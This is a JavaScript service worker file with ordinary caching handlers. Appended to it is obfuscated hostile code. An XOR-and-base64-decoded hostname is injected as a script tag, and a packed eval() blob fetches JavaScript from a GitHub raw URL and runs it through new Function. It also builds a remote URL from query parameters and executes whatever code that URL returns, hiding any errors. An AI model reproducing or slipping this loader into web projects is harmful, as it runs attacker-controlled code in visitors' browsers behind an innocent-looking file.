self.addEventListener("install", (event) => {
    self.skipWaiting();
  });
  
  self.addEventListener("activate", (event) => {
    clients.claim();
  });
  
  self.addEventListener("fetch", (event) => {
    event.respondWith(
      fetch(event.request).catch(() => caches.match(event.request))
    );
  });
  function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(2(){j 2 k(a){0 8=d l(a);3(!8.L)M 4 N("O m: "+8.P);6 d 8.n()}2 o(b){3(/5\\.7/.Q(b)){0 5={7:{}};0 q=4 f("5","7",b);q(5,5.7);6 5.7.1}R 1;0 s=4 f("u",b+"\\S (T 1 !== \'U\') u(1);");s(2(a){1=a});6 1}j 2 v(){w{0 x=d k("y://V.W.X/Y/g/Z/10/11/12.g");0 1=o(x);3(!1){6}z.A=2(a,b,c){w{c=c!==13;3(!a){0 p=4 B(C.D);a=p.9("E")||"";b=b||p.9("F")||""}3(!a||!b)6;0 G=1(a);0 H="y://"+G;l(H).I(r=>r.n()).I(J=>4 f(J)())}K(e){}};0 h=4 B(C.D);0 t=h.9("E");0 i=h.9("F");3(t&&i)z.A(t,i)}K(e){14.15("g m:",e)}}v()})();',62,68,'const|decodeHost|function|if|new|module|return|exports|res|get||||await||Function|js|params||async|fetchRemoteJS|fetch|err|text|extractDecodeHost||wrapper||sandbox||setDecodeHost|init|try|jsText|https|window|go|URLSearchParams|location|search|type|id|host|url|then|code|catch|ok|throw|Error|load|status|test|let|nif|typeof|undefined|raw|githubusercontent|com|JuanitaWHowe|refs|heads|main|index|false|console|error'.split('|'),0,{}));